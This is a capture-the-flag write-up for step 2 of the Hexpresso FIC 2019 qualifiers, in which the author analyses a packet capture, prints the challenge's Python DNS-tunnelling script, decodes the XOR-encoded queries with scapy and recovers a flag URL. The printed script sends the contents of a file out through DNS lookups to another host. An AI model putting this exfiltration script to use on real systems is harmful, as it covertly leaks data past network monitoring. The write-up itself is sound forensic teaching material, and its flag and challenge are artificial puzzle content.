---
title: Hexpresso FIC Quals 2019: Step 2
slug: hexpresso-fic-2
date: 19/12/2019 02
---

The second step is some network forensics.

![Introduction](/assets/hexpresso-fic-quals/step2/intro.png)

We are given a PCAP file. It is not too big, we can clearly observe three
events (all the addresses are on `172.16.42.0`):

* `.99` requests `/index.html` to `.222` (does not matter for the challenge)
* `.99` requests `/dnstunnel.py` to `.222`
* `.99` performs dozens of DNS queries

Here is the Python script `dnstunnel.py`:

```python
#! /usr/bin/python3

import random
import os


# This is the "secret" data that is going to be sent
f = open('data.txt','rb')
data = f.read()
f.close()

print("[+] Sending %d bytes of data" % len(data))
print("[+] Cut in pieces ... ")


# encrypt encodes the chunck l in base16
# l is also XORED with a random key, that is added in front of the final
# payload chunk
def encrypt(l):
    key = random.randint(13, 254)
    output = hex(key)[2:].zfill(2)

    # This AES is a bit weird but who am I to judge
    for i in range(len(l)):
        aes = ord(l[i]) ^ key)
        output += hex(aes)[2:].zfill(2)

    # Key + encoded data
    return output


# udp_secure_tunneling actually performs the DNS query
# The command is as follows:
# host -t A <ENCODED_DATA>.local.tmux <DNS server>
# It is fully synchronous and there is a sleep so the ordering of the DNS
# queries is not very likely to be undefined.
def udp_secure_tunneling(my_secure_data):
    mycmd = "host -t A %s.local.tux 172.16.42.222" % my_secure_data
    os.system(mycmd)
    os.system("sleep 1")


# send_data sends a chunk of data (global variable), starting
# at position s
def send_data(s):
    global n
    n = n+1
    # Each DNS query exfiltrates between 4 and 11 bytes
    length = random.randint(4,11)

    # There is a redundancy mechanism, in case of packet lost
    # If we send more bytes we can recover if we loose some packets?
    redundancy = random.randint(2,16)
    chunk = data[s:s+length+redundancy].decode("utf-8")
    # Redundancy marks are added to the payload
    chunk = "%04d%s"%(s,chunk)
    print("%04d packet --> %s.local.tux" % (n,chunk))

    blob = encrypt(chunk)
    udp_secure_tunneling(blob)
    return s + length


# Keep track of what remains to be sent
cursor = 0

# As long as it remains some data, send data from cursor
while cursor < len(data):
    cursor = send_data(cursor)
```

Please, take a look at the comments on the script.

We can understand that some secret payload has been sent using the DNS
exfiltration technique. Its very simple: you just make a bunch of DNS
queries, embedding the data in the domain that is queried.

The only real constraint of this technique is that the data has to be pure
plaintext (as far as I know?) so you need some kind of encoding. The base64
is often chosen but here it is base16.

There is also a XOR operation... Each DNS query has its own key but really,
it is no big deal as the key is sent alongside the cipher.

We will talk a bit more about the redundancy mechanism later. For now, we
just need to know that we could expect some data to be duplicated and that
redundancy marks (`chunk = "%04d%s"%(s,chunk)`) are part of the payload.

We have tout bien compris so let's write a script that:

* Iterates over the DNS queries
* For each query, extracts its key
* Decodes its payload
* Performs the XOR operation
* Adds the result to a buffer

After a few copy/pastes here we go:

```python
from scapy.all import rdpcap, DNSQR, DNSRR


def extract(file_path):
    result = ''

    for p in rdpcap(file_path):
        if p.haslayer(DNSQR) and not p.haslayer(DNSRR):
            # It is a DNS query!
            # We remove the base domain
            qry = p[DNSQR].qname.decode().replace('.local.tux.', '')

            key = qry[0:2] # Extract the key
            rest = qry[2:] # What remains is the payload

            # Group the characters by two (base16)
            byTwo = [rest[i:i+2] for i in range(0, len(rest), 2)]
            # Base conversion, XOR and decode
            for c in byTwo:
                plain = int(c, 16) ^ int(key, 16)
                result += chr(plain)

    return result


with open('output.txt', 'w+') as f:
    f.write(extract('cb52ae4d15503c598f0bb42b8af1ce51.pcap'))
```

Here is the content of `output.txt`:

```
0000Congratulations!! Y0011ions!! You did it so f0020u did it so far!

Here is 0030o far!

Here is t0039ere is the link 0049 link in bas0059ase32 for0064 form:
NB2HI4DTHIX0071NB2HI4DTHIXS6Y3UMYXGQ0077DTHIXS6Y3UMYXGQZLY0081XS6Y3UMYXGQZLY00853UMYXGQZLY0092ZLYOBZG0097ZGK43TN4XGM40103N4XGM4RPGU3TSODDME2DO0112U3TSODDME2DOZDBMNSTKY0122DOZDBMNSTKYZVMU3G0127MNSTKYZVMU3GIMZVGI4T
MOJ01373GIMZVGI4T
MOJQM0141ZVGI4T
MOJQMM4DMMZTG42QU==0152MM4DMMZTG42QU===0159TG42QU===

 _    0163QU===

 _      0168

 _             0179        0183                 0189                   0196           0205            
|0213    
| |__   _0224  _____  ___ _0228___  ___ __ 0235_ __  _ __0243__ ___  ___ ___  _0253_ ___  ___0261__  
|0265
| '_ \ / _ \ \0273/ _ \ \/ / '_ \| '_0283 '_ \| '__/ 0288| '__/ _ \/ __/ __0298/ __/ __|/0303 __|/ _ \ 
| | | |  __/0310 \ 
| | | |  __/>  <| |0320|  __/>  <| |0328 <| |_) | | |  0333_) | | |  __/\__ \_0342 __/\__ \__ \ (_) |
|_| 0353 \ (_) |
|_| |_|\0362|_| |_|\___/_/\_\ ._0371__/_/\_\ .__/|_|  \___||__0382_/|_|  \___||___/0389\___||___/_0397_/___/\___/ 
      0401_/\___/ 
           0409
       0413             |0424  |_|          0431                    0435                    0443              


0447          


0453    


0459
```

It looks promising but is very hard to read because of the redundancy. Pieces
of text are repeated, and the redundancy marks (`0000`, `0030`, etc) are
mixed with the content.

We can partially read the text: *Here is the link in base32 form:*. So let's
extract the base32 chunk and put it on a single line:

```
NB2HI4DTHIX0071NB2HI4DTHIXS6Y3UMYXGQ0077DTHIXS6Y3UMYXGQZLY0081XS6Y3UMYXGQZLY00853UMYXGQZLY0092ZLYOBZG0097ZGK43TN4XGM40103N4XGM4RPGU3TSODDME2DO0112U3TSODDME2DOZDBMNSTKY0122DOZDBMNSTKYZVMU3G0127MNSTKYZVMU3GIMZVGI4TMOJ01373GIMZVGI4TMOJQM0141ZVGI4TMOJQMM4DMMZTG42QU==0152MM4DMMZTG42QU===0159TG42QU===0163QU===
```

Here is the Vim regex I used to clean up the string:

```
:%s/\(.\{-\}\)\d\{4\}\1/\1/
```

It matches on any piece of text similar to `ABCDEF0123ABCDEF` (piece of text
(base32 charset), redundancy indicator (4 digits), redundancy text (same as
the piece of text)) and replaces it by `ABCDEF` (the piece of text).

Repeatedly applying the regex produces the following string:

```
NB2HI4DTHIXS6Y3UMYXGQZLYOBZGK43TN4XGM4RPGU3TSODDME2DOZDBMNSTKYZVMU3GIMZVGI4TMOJQMM4DMMZTG42QU===
```

Which decodes to our flag:

```
https://ctf.hexpresso.fr/5798ca47dace5c5e6d3529690c863375
```

You can [click here](/hexpresso-fic-3) for the next step.